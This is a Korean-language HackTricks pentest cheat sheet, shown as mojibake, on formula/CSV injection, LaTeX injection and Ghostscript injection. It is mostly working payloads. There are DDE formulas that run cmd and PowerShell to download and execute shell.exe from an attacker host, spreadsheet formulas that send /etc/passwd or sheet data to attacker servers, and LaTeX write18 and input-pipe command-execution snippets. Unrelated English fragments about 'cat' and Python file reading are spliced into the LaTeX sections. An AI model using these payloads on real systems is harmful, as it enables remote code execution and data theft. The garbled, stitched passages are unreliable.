# ê³µì‹/CSV/ë¬¸ì„œ/LaTeX/GhostScript ì‚½ì…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

ê°€ì¥ ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ì°¾ì•„ì„œ ë” ë¹ ë¥´ê²Œ ìˆ˜ì •í•˜ì„¸ìš”. IntruderëŠ” ê³µê²© ëŒ€ìƒì„ ì¶”ì í•˜ê³  ì ê·¹ì ì¸ ìœ„í˜‘ ìŠ¤ìº”ì„ ì‹¤í–‰í•˜ì—¬ APIë¶€í„° ì›¹ ì•± ë° í´ë¼ìš°ë“œ ì‹œìŠ¤í…œê¹Œì§€ ì „ì²´ ê¸°ìˆ  ìŠ¤íƒì—ì„œ ë¬¸ì œë¥¼ ì°¾ìŠµë‹ˆë‹¤. [**ë¬´ë£Œë¡œ ì‹œë„í•´ë³´ì„¸ìš”**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ì˜¤ëŠ˜.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## ê³µì‹ ì‚½ì…

### ì •ë³´

**ì…ë ¥**ì´ **CSV íŒŒì¼** (ë˜ëŠ” Excelì—ì„œ ì—´ë¦´ ê°€ëŠ¥ì„±ì´ ìˆëŠ” ë‹¤ë¥¸ íŒŒì¼)ì— **ë°˜ì˜**ë˜ê³  ìˆë‹¤ë©´, Excel ì‹œíŠ¸ ë‚´ì—ì„œ **íŒŒì¼ì„ ì—´ ë•Œ** ë˜ëŠ” ì‚¬ìš©ìê°€ **ì¼ë¶€ ë§í¬ë¥¼ í´ë¦­í•  ë•Œ** ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” Excel **ê³µì‹**ì„ ë„£ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
í˜„ì¬ Excelì€ ì‚¬ìš©ìê°€ ì•…ì˜ì ì¸ ì‘ì—…ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ Excel ì™¸ë¶€ì—ì„œ ë¬´ì–¸ê°€ë¥¼ ë¡œë“œí•  ë•Œ ì‚¬ìš©ìì—ê²Œ ê²½ê³ ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤. ë”°ë¼ì„œ ìµœì¢… í˜ì´ë¡œë“œì— ëŒ€í•´ ì‚¬íšŒ ê³µí•™ì ì¸ ë…¸ë ¥ì´ í•„ìš”í•©ë‹ˆë‹¤.
{% endhint %}

### [ì›Œë“œë¦¬ìŠ¤íŠ¸](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### í•˜ì´í¼ë§í¬

**ë‹¤ìŒ ì˜ˆì œëŠ” ìµœì¢… ì—‘ì…€ ì‹œíŠ¸ì—ì„œ ì½˜í…ì¸ ë¥¼ ìœ ì¶œí•˜ê³  ì„ì˜ì˜ ìœ„ì¹˜ë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ë° ë§¤ìš° ìœ ìš©í•˜ì§€ë§Œ, ì‚¬ìš©ìê°€ ë§í¬ë¥¼ í´ë¦­í•˜ê³  ê²½ê³  ë©”ì‹œì§€ë¥¼ ìˆ˜ë½í•´ì•¼í•©ë‹ˆë‹¤.**

ë‹¤ìŒ ì˜ˆì œëŠ” [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.

í•™ìƒ ê¸°ë¡ ê´€ë¦¬ ì‹œìŠ¤í…œì—ì„œ ë³´ì•ˆ ì¹¨í•´ê°€ CSV ì£¼ì… ê³µê²©ì„ í†µí•´ ì•…ìš©ë˜ëŠ” ìƒí™©ì„ ìƒìƒí•´ë³´ì‹­ì‹œì˜¤. ê³µê²©ìì˜ ì£¼ìš” ì˜ë„ëŠ” í•™ìƒ ì„¸ë¶€ ì •ë³´ë¥¼ ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì‹œìŠ¤í…œì„ ì¹¨í•´í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ê³µê²©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì•…ì„± í˜ì´ë¡œë“œë¥¼ ì£¼ì…í•¨ìœ¼ë¡œì¨ íŠ¹íˆ í•™ìƒ ì„¸ë¶€ ì •ë³´ë¥¼ ìœ„í•œ í•„ë“œì— í•´ë¡œìš´ ìˆ˜ì‹ì„ ì…ë ¥í•¨ìœ¼ë¡œì¨ ê³µê²©ì´ ì§„í–‰ë©ë‹ˆë‹¤. ê³µê²©ì€ ë‹¤ìŒê³¼ ê°™ì´ ì§„í–‰ë©ë‹ˆë‹¤:

1. **ì•…ì„± í˜ì´ë¡œë“œ ì£¼ì…:**
- ê³µê²©ìëŠ” í•™ìƒ ì„¸ë¶€ ì •ë³´ ì–‘ì‹ì„ ì œì¶œí•˜ì§€ë§Œ ìŠ¤í”„ë ˆë“œì‹œíŠ¸ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ìˆ˜ì‹ (ì˜ˆ: `=HYPERLINK("<malicious_link>","Click here")`)ì„ í¬í•¨í•©ë‹ˆë‹¤.
- ì´ ìˆ˜ì‹ì€ í•˜ì´í¼ë§í¬ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆì§€ë§Œ, ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì•…ì„± ì„œë²„ë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.

2. **ì¹¨í•´ëœ ë°ì´í„° ë‚´ë³´ë‚´ê¸°:**
- ì¹¨í•´ ì‚¬ì‹¤ì„ ëª¨ë¥´ëŠ” êµì‚¬ë“¤ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ CSV íŒŒì¼ë¡œ ë‚´ë³´ëƒ…ë‹ˆë‹¤.
- CSV íŒŒì¼ì€ ì—¬ì „íˆ ì•…ì„± í˜ì´ë¡œë“œë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œëŠ” ìŠ¤í”„ë ˆë“œì‹œíŠ¸ì—ì„œ í´ë¦­ ê°€ëŠ¥í•œ í•˜ì´í¼ë§í¬ë¡œ í‘œì‹œë©ë‹ˆë‹¤.

3. **ê³µê²© íŠ¸ë¦¬ê±°:**
- êµì‚¬ëŠ” í•™ìƒì˜ ì„¸ë¶€ ì •ë³´ì˜ ì¼ë¶€ë¡œ ì—¬ê¸°ê³  í•˜ì´í¼ë§í¬ë¥¼ í´ë¦­í•©ë‹ˆë‹¤.
- í´ë¦­í•˜ë©´ ë¯¼ê°í•œ ë°ì´í„° (ìŠ¤í”„ë ˆë“œì‹œíŠ¸ ë˜ëŠ” êµì‚¬ì˜ ì»´í“¨í„°ì—ì„œ ê°€ì ¸ì˜¨ ì„¸ë¶€ ì •ë³´ í¬í•¨)ê°€ ê³µê²©ìì˜ ì„œë²„ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

4. **ë°ì´í„° ê¸°ë¡:**
- ê³µê²©ìì˜ ì„œë²„ëŠ” êµì‚¬ì˜ ì»´í“¨í„°ì—ì„œ ì „ì†¡ëœ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ìˆ˜ì‹ í•˜ê³  ê¸°ë¡í•©ë‹ˆë‹¤.
- ê³µê²©ìëŠ” ì´ ë°ì´í„°ë¥¼ ë‹¤ì–‘í•œ ì•…ì˜ì  ëª©ì ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ í•™ìƒ ë° ê¸°ê´€ì˜ ê°œì¸ ì •ë³´ì™€ ë³´ì•ˆì„ ë”ìš± ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### RCE

**ìì„¸í•œ ë‚´ìš©ì€ [ì›ë³¸ ê²Œì‹œë¬¼](https://notsosecure.com/data-exfiltration-formula-injection-part1)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.**

êµ¬ì²´ì ì¸ êµ¬ì„± ë˜ëŠ” ì˜¤ë˜ëœ ë²„ì „ì˜ Excelì—ì„œëŠ” ë™ì  ë°ì´í„° êµí™˜(Dynamic Data Exchange, DDE)ë¼ëŠ” ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í™œìš©í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ì„¤ì •ì„ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤:

- íŒŒì¼ â†’ ì˜µì…˜ â†’ ì‹ ë¢° ì„¼í„° â†’ ì‹ ë¢° ì„¼í„° ì„¤ì • â†’ ì™¸ë¶€ ì½˜í…ì¸ ë¡œ ì´ë™í•˜ì—¬ **ë™ì  ë°ì´í„° êµí™˜ ì„œë²„ ì‹œì‘**ì„ í™œì„±í™”í•©ë‹ˆë‹¤.

ì•…ì„± í˜ì´ë¡œë“œê°€ í¬í•¨ëœ ìŠ¤í”„ë ˆë“œì‹œíŠ¸ê°€ ì—´ë¦¬ë©´ (ì‚¬ìš©ìê°€ ê²½ê³ ë¥¼ ìˆ˜ë½í•˜ëŠ” ê²½ìš°) í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ê³„ì‚°ê¸° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ì„ ê²ƒì…ë‹ˆë‹¤:
```markdown
`=cmd|' /C calc'!xxx`
```
ì¶”ê°€ì ì¸ ëª…ë ¹ì–´ë„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. PowerShellì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calcì—ì„œì˜ ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI)

LibreOffice CalcëŠ” ë¡œì»¬ íŒŒì¼ì„ ì½ê³  ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ëª‡ ê°€ì§€ ë°©ë²•ì…ë‹ˆë‹¤:

- ë¡œì»¬ `/etc/passwd` íŒŒì¼ì—ì„œ ì²« ë²ˆì§¸ ì¤„ ì½ê¸°: `='file:///etc/passwd'#$passwd.A1`
- ì½ì€ ë°ì´í„°ë¥¼ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì„œë²„ë¡œ ìœ ì¶œí•˜ê¸°: `=WEBSERVICE(CONCATENATE("http://<ê³µê²©ì IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- ì—¬ëŸ¬ ì¤„ ìœ ì¶œí•˜ê¸°: `=WEBSERVICE(CONCATENATE("http://<ê³µê²©ì IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS ìœ ì¶œ (ì½ì€ ë°ì´í„°ë¥¼ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” DNS ì„œë²„ë¡œ DNS ì¿¼ë¦¬ë¡œ ë³´ë‚´ê¸°): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<ê³µê²©ì ë„ë©”ì¸>"))`

### Out-of-Band (OOB) ë°ì´í„° ìœ ì¶œì„ ìœ„í•œ Google Sheets

Google SheetsëŠ” OOB ë°ì´í„° ìœ ì¶œì„ ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤:

- **CONCATENATE**: ë¬¸ìì—´ì„ ì—°ê²°í•©ë‹ˆë‹¤ - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: êµ¬ì¡°í™”ëœ ë°ì´í„° ìœ í˜•ì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤ - `=IMPORTXML(CONCAT("http://<ê³µê²©ì IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: RSS ë˜ëŠ” ATOM í”¼ë“œë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤ - `=IMPORTFEED(CONCAT("http://<ê³µê²©ì IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: HTML í…Œì´ë¸”ì´ë‚˜ ëª©ë¡ì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤ - `=IMPORTHTML (CONCAT("http://<ê³µê²©ì IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: ë‹¤ë¥¸ ìŠ¤í”„ë ˆë“œì‹œíŠ¸ì—ì„œ ì…€ ë²”ìœ„ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤ - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: ì´ë¯¸ì§€ë¥¼ ì…€ì— ì‚½ì…í•©ë‹ˆë‹¤ - `=IMAGE("https://<ê³µê²©ì IP:Port>/images/srpr/logo3w.png")`


## LaTeX ì‚½ì…

ì¼ë°˜ì ìœ¼ë¡œ ì¸í„°ë„·ì—ì„œ ì°¾ì„ ìˆ˜ ìˆëŠ” **LaTeX ì½”ë“œë¥¼ PDFë¡œ ë³€í™˜í•˜ëŠ” ì„œë²„**ëŠ” **`pdflatex`**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.\
ì´ í”„ë¡œê·¸ë¨ì€ ëª…ë ¹ ì‹¤í–‰ì„ (ë¹„)í—ˆìš©í•˜ê¸° ìœ„í•´ 3ê°€ì§€ ì£¼ìš” ì†ì„±ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:

* **`--no-shell-escape`**: `\write18{command}` êµ¬ë¬¸ì„ ë¹„í™œì„±í™”í•©ë‹ˆë‹¤. texmf.cnf íŒŒì¼ì—ì„œ í™œì„±í™”ë˜ì–´ ìˆë”ë¼ë„.
* **`--shell-restricted`**: `--shell-escape`ì™€ ë™ì¼í•˜ì§€ë§Œ 'ì•ˆì „í•œ' ë¯¸ë¦¬ ì •ì˜ëœ ëª…ë ¹ì–´ ì§‘í•©ìœ¼ë¡œ **ì œí•œ**ë©ë‹ˆë‹¤ (\*\*Ubuntu 16.04ì—ì„œ ëª©ë¡ì€ `/usr/share/texmf/web2c/texmf.cnf`ì— ìˆìŠµë‹ˆë‹¤).
* **`--shell-escape`**: `\write18{command}` êµ¬ë¬¸ì„ í™œì„±í™”í•©ë‹ˆë‹¤. ëª…ë ¹ì€ ì…¸ ëª…ë ¹ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ë¬¸ì€ ì¼ë°˜ì ìœ¼ë¡œ ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ëª…ë ¹ ì‹¤í–‰ì„ í”¼í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ ë°©ë²•ë„ ìˆìœ¼ë¯€ë¡œ RCEë¥¼ í”¼í•˜ê¸° ìœ„í•´ `--shell-restricted`ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤.

### íŒŒì¼ ì½ê¸° <a href="#read-file" id="read-file"></a>

\[ë‚˜ $ì™€ ê°™ì€ ë˜í¼ë¡œ ì‚½ì…ì„ ì¡°ì •í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### ë‹¨ì¼ ì¤„ íŒŒì¼ ì½ê¸°

To read a single-lined file, you can use the `cat` command followed by the file name. This will display the contents of the file on the terminal.

```bash
cat filename
```

Replace `filename` with the name of the file you want to read.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### ì—¬ëŸ¬ ì¤„ë¡œ êµ¬ì„±ëœ íŒŒì¼ ì½ê¸°

To read a file that contains multiple lines, you can use the following code:

```python
with open('filename.txt', 'r') as file:
    lines = file.readlines()
    for line in lines:
        print(line.strip())
```

This code opens the file `filename.txt` in read mode and uses the `readlines()` method to read all the lines in the file. It then iterates over each line and prints it after removing any leading or trailing whitespace using the `strip()` method.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### íŒŒì¼ ì‘ì„± <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### ëª…ë ¹ ì‹¤í–‰ <a href="#command-execution" id="command-execution"></a>

ëª…ë ¹ì–´ì˜ ì…ë ¥ì€ stdinìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤. ì´ë¥¼ ì–»ê¸° ìœ„í•´ ì„ì‹œ íŒŒì¼ì„ ì‚¬ìš©í•˜ì„¸ìš”.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
ë§Œì•½ LaTex ì˜¤ë¥˜ê°€ ë°œìƒí•œë‹¤ë©´, ë‚˜ìœ ë¬¸ì ì—†ì´ ê²°ê³¼ë¥¼ ì–»ê¸° ìœ„í•´ base64ë¥¼ ì‚¬ìš©í•´ë³´ì„¸ìš”.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)ë¡œë¶€í„°
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript ì£¼ì…

**[https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)ì„ í™•ì¸í•˜ì„¸ìš”.**

## ì°¸ê³  ìë£Œ

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

ê°€ì¥ ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ì°¾ì•„ì„œ ë¹ ë¥´ê²Œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. IntruderëŠ” ê³µê²© ëŒ€ìƒì„ ì¶”ì í•˜ê³  ì˜ˆë°©ì ì¸ ìœ„í˜‘ ìŠ¤ìº”ì„ ì‹¤í–‰í•˜ì—¬ APIë¶€í„° ì›¹ ì•± ë° í´ë¼ìš°ë“œ ì‹œìŠ¤í…œê¹Œì§€ ê¸°ìˆ  ìŠ¤íƒ ì „ì²´ì—ì„œ ë¬¸ì œë¥¼ ì°¾ìŠµë‹ˆë‹¤. [**ë¬´ë£Œë¡œ ì‹œë„í•´ë³´ì„¸ìš”**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ì˜¤ëŠ˜.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ ì‚¬ìš©í•˜ì—¬ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
